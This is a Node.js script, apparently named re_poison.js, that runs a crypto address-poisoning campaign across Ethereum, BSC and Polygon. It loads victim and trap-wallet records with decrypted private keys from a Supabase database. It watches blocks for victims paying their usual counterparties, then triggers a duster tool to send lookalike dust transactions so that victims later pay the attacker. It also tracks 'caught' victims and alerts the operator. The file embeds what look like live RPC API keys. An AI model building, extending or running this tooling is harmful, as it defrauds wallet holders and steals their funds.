import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';
import { createPublicClient, http, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

// --- Recreate __dirname for ES Modules ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execAsync = promisify(exec);

console.log('[DEBUG] Starting optimized re_poison.js...');

// --- Supabase Service Client (bypass RLS) ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
}

// --- Config ---
const {
  files: { caught: caughtFile },
  rpc: { observer: observerRpcUrl },
  rePoison: { cooldownMs, dustRetries, delayBetweenMs },
} = config;

// --- State ---
const victims = new Map();
let blockPollInterval = null;
let caughtVictimsPollInterval = null;
let lastBlockProcessed = 0n;

// Async Mutex Lock to prevent RPC exhaustion and concurrent Python spawns
let isScanning = false;

// ─── Load caught victims from database ───
const caughtVictims = new Set();

async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    const { data, error } = await supabaseService
      .from('traps')
      .select('victim_address')
      .eq('is_caught', true);

    if (error) {
      console.warn(`[DEBUG] Supabase query for caught victims failed: ${error.message}`);
      return;
    }

    if (data && data.length > 0) {
      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
  }
}

// ─── Load traps from database ───
async function loadTrapsFromDB() {
  if (!supabaseService) {
    console.error('[re_poison] Supabase service not available');
    process.exit(1);
  }

  try {
    const { data: campaigns, error: campError } = await supabaseService
      .from('campaigns')
      .select('id')
      .eq('chain', chainName);

    if (campError) {
      console.error(`[DEBUG] Failed to fetch campaigns: ${campError.message}`);
      return 0;
    }

    if (!campaigns || campaigns.length === 0) {
      console.log(`[DEBUG] No campaigns found for chain ${chainName}`);
      return 0;
    }

    const campaignIds = campaigns.map(c => c.id);

    const { data: traps, error: trapError } = await supabaseService
      .from('traps')
      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
      .in('campaign_id', campaignIds);

    if (trapError) {
      console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
      return 0;
    }

    if (!traps || traps.length === 0) {
      console.log(`[DEBUG] No traps found for campaigns on chain ${chainName}`);
      return 0;
    }

    console.log(`[DEBUG] Fetched ${traps.length} traps from database`);

    let loaded = 0;
    for (const row of traps) {
      try {
        const privateKey = decrypt(row.trap_private_key_enc);
        const victim = row.victim_address.toLowerCase();
        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
        const campaignId = row.campaign_id;

        victims.set(victim, {
          privateKey,
          trapAddress: row.trap_address.toLowerCase(),
          counterparty,
          lastPoison: 0,
          campaignId,
        });
        loaded++;
      } catch (err) {
        console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
      }
    }

    console.log(`[DEBUG] Loaded ${loaded} victims from database`);
    return loaded;
  } catch (err) {
    console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
    return 0;
  }
}

// --- MULTI‑CHAIN ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

const chainRpc = chainCfg?.rpc || observerRpcUrl;

console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log(`[DEBUG] Observer RPC: ${chainRpc}`);
console.log('[DEBUG] cooldownMs:', cooldownMs);
console.log('[DEBUG] dustRetries:', dustRetries);
console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);

const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
const DUST_RETRIES = dustRetries || 2;
const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
const EXEC_TIMEOUT_MS = 180000; 

// --- Dynamic cooldown limits ---
const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);

// --- Deduplication and concurrency control ---
const processedTxHashes = new Map();
const trapLocks = new Map();

// --- Per‑victim statistics ---
const victimStats = new Map();
const victimTxTimestamps = new Map();
let lastStatsLogTime = 0;
const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;

// 🚀 OPTIMIZATION: Pre-compute token address map for O(1) lookups in hot path
const tokenAddressMap = new Map();
if (chainCfg && chainCfg.tokens) {
  for (const [symbol, address] of Object.entries(chainCfg.tokens)) {
    tokenAddressMap.set(address.toLowerCase(), symbol);
  }
}

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

const normalizedChain = chainName?.toLowerCase() || '';
const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

const client = createPublicClient({
  chain: viemChain,
  transport: fallback(
    fallbackUrls.map(url => http(url, { timeout: 8000 })),
    { rank: false }
  ),
});

// --- Helper: retry wrapper ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
  return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
}

// --- Compute dynamic cooldown ---
function getDynamicCooldown(victimAddress) {
  const timestamps = victimTxTimestamps.get(victimAddress);
  if (!timestamps || timestamps.length < 2) return COOLDOWN_MS;

  let sum = 0;
  const len = timestamps.length;
  for (let i = 1; i < len; i++) {
    sum += timestamps[i] - timestamps[i - 1];
  }
  const avgInterval = sum / (len - 1);

  let cooldown = avgInterval * 0.3;
  return Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
}

// ─── Asset detection from transaction ───────────────
function getAssetFromTx(tx) {
  if (!tx || !tx.to) return null;
  const to = tx.to.toLowerCase();
  
  const tokenSymbol = tokenAddressMap.get(to);
  if (tokenSymbol) {
    return tokenSymbol;
  }

  if (tx.value && BigInt(tx.value) > 0n) {
    return nativeSymbol;
  }

  return null;
}

// ─── Send dust via duster.py (accepts optional asset) ──
async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
  const dusterPath = path.resolve(__dirname, '../tools/duster.py');
  const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');

  const env = { ...process.env, CHAIN: chainName };
  if (campaignId) env.CAMPAIGN_ID = campaignId;
  if (asset) env.DUST_ASSET = asset;

  const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;

  try {
    const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
    if (stderr) logger.warn(`duster stderr: ${stderr}`);
    logger.info(`duster stdout: ${stdout.trim()}`);
    
    // 🚀 NEW: Extract TX hash from stdout (matches 0x followed by 64 hex chars)
    const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
    return txHashMatch ? txHashMatch[0] : true; // Return hash if found, otherwise true for success
  } catch (error) {
    if (error.killed && error.signal === 'SIGTERM') {
      logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
    } else {
      logger.error(`duster error: ${error.message}`);
    }
    return false;
  }
}

// --- Poison a victim (accepts asset) ---
async function poisonVictim(victimAddress, privateKey, campaignId, asset = null) {
  logger.info(`Re‑poisoning victim ${victimAddress}...`);
  let successCount = 0;
  let txHash = null;

  for (let i = 0; i < DUST_RETRIES; i++) {
    const result = await sendDust(privateKey, victimAddress, campaignId, asset);
    if (result) {
      successCount++;
      if (typeof result === 'string' && result.startsWith('0x')) {
        txHash = result;
      }
      // 🚀 OPTIMIZATION: Break early if successful to save time and prevent duplicate attempts
      break; 
    }
    if (i < DUST_RETRIES - 1) {
      await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
    }
  }

  // 🚀 NEW: Clearly distinguish between success and failure in the message
  const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
  const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';
  const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
  logger.info(msg);

  // 🚀 THROTTLE: Only send Telegram alert if it actually succeeded, to save DB/Telegram API limits
  if (successCount > 0) {
    try {
      await sendAlert(`♻️ ${msg}`, 'info', campaignId);
    } catch (err) {
      logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
    }
  }

  const entry = victims.get(victimAddress);
  if (entry) entry.lastPoison = Date.now();

  let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
  stats.attempts++;
  if (successCount > 0) stats.successes++;
  else stats.failures++;
  victimStats.set(victimAddress, stats);

  const totalAttempts = Array.from(victimStats.values()).reduce((sum, s) => sum + s.attempts, 0);
  const now = Date.now();
  if (totalAttempts % 10 === 0 || now - lastStatsLogTime > STATS_LOG_INTERVAL_MS) {
    let summary = `📊 Re‑poison stats (total attempts: ${totalAttempts}):\n`;
    for (const [addr, s] of victimStats) {
      summary += `  ${addr}: ${s.successes} success, ${s.failures} fail (${s.attempts} attempts)\n`;
    }
    logger.info(summary);
    lastStatsLogTime = now;
  }
}

// --- Check a single transaction ---
function checkTransaction(tx) {
  if (!tx || !tx.from || !tx.to || !tx.hash) return;

  const from = tx.from.toLowerCase();
  const to = tx.to.toLowerCase();
  const hash = tx.hash;
  const now = Date.now();

  // Deduplicate
  if (processedTxHashes.has(hash)) return;
  processedTxHashes.set(hash, now);

  // 🚀 OPTIMIZATION: Clearing the map is O(1) and prevents CPU spikes from iterative deletion
  if (processedTxHashes.size > 50000) {
    processedTxHashes.clear();
    logger.debug('Cleared processedTxHashes map to prevent memory bloat');
  }

  // Caught victim exclusion
  if (caughtVictims.has(from)) {
    victims.delete(from);
    return;
  }

  if (!victims.has(from)) return;

  const entry = victims.get(from);

  // Counterparty wildcard check
  if (entry.counterparty && to !== entry.counterparty) {
    return;
  }

  // Dynamic cooldown check
  let timestamps = victimTxTimestamps.get(from);
  if (!timestamps) {
    timestamps = [];
    victimTxTimestamps.set(from, timestamps);
  }
  timestamps.push(Date.now());
  
  if (timestamps.length > 10) {
    timestamps.shift();
  }

  const dynamicCooldown = getDynamicCooldown(from);
  if (now - entry.lastPoison < dynamicCooldown) return;

  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
  if (trapLocks.get(entry.privateKey)) {
    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
    return;
  }
  trapLocks.set(entry.privateKey, true);

  // ─── Detect asset from the transaction ───
  const detectedAsset = getAssetFromTx(tx);
  if (detectedAsset) {
    logger.info(`[asset] Detected asset for re-poison: ${detectedAsset}`);
  } else {
    logger.info('[asset] No specific asset detected, will fallback to USDC/USDT');
  }

  // Async Execution
  (async () => {
    try {
      const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
      logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);

      try {
        await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
      } catch (alertErr) {
        logger.warn(`Failed to send initial alert: ${alertErr.message}`);
      }

      await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
    } catch (err) {
      logger.error(`Error in async poison task for ${from}: ${err.message}`);
    } finally {
      trapLocks.delete(entry.privateKey);
    }
  })();
}

// --- Block scanner ---
const MAX_BLOCKS_PER_SCAN = 20; // 🚀 Prevent catch-up storms

async function scanNewBlocks() {
  if (isScanning) return;
  isScanning = true;

  try {
    const currentBlock = await withRpcRetry(
      () => client.getBlockNumber(),
      'getBlockNumber',
      2,
      1000
    );
    
    if (lastBlockProcessed === 0n) {
      lastBlockProcessed = currentBlock > 5n ? currentBlock - 5n : 0n;
      console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
      isScanning = false;
      return;
    }

    let startBlock = lastBlockProcessed + 1n;
    let endBlock = currentBlock;
    const blockDiff = Number(endBlock - startBlock);

    if (blockDiff > MAX_BLOCKS_PER_SCAN) {
      logger.warn(`Fell behind by ${blockDiff} blocks. Capping scan to latest ${MAX_BLOCKS_PER_SCAN} blocks to prevent CPU/RPC overload.`);
      startBlock = currentBlock - BigInt(MAX_BLOCKS_PER_SCAN) + 1n;
    }

    if (startBlock <= endBlock) {
      for (let block = startBlock; block <= endBlock; block++) {
        const fullBlock = await withRpcRetry(
          () => client.getBlock({ blockNumber: block, includeTransactions: true }),
          `getBlock(${block})`,
          2,
          1000
        );

        if (fullBlock && fullBlock.transactions) {
          for (const tx of fullBlock.transactions) {
            try {
              checkTransaction(tx);
            } catch (err) {
              logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
            }
          }
        }
      }
      lastBlockProcessed = endBlock;
    }
  } catch (err) {
    logger.warn(`Block scan error: ${err.message}`);
  } finally {
    isScanning = false;
  }
}

// --- Start watcher ---
function startWatcher() {
  console.log('[DEBUG] Starting block‑based watcher...');
  logger.info('Watching new blocks for victim → counterparty transactions...');

  (async () => {
    try {
      lastBlockProcessed = await client.getBlockNumber();
      console.log(`[DEBUG] Starting from block ${lastBlockProcessed}`);
    } catch (e) {
      console.error(`[DEBUG] Failed to get initial block: ${e.message}`);
    }
  })();

  blockPollInterval = setInterval(scanNewBlocks, 120000);
  
  // 🚀 THROTTLE: Poll caught victims every 2 minutes (120000ms) to save DB connections
  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);

  console.log('[DEBUG] Watcher started.');
}

// --- Graceful shutdown ---
setupGracefulShutdown();

onShutdown(async () => {
  console.log('[DEBUG] Shutting down...');
  if (blockPollInterval) clearInterval(blockPollInterval);
  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
  console.log('[DEBUG] Intervals cleared.');
});

// --- Main ---
console.log('[DEBUG] Loading traps from database...');
const loaded = await loadTrapsFromDB();
if (loaded === 0) {
  logger.error(`No victims loaded from database. Exiting.`);
  console.error(`[DEBUG] No victims loaded. Exiting.`);
  process.exit(1);
}

await loadCaughtVictims();

console.log('[DEBUG] Starting watcher...');
startWatcher();
logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');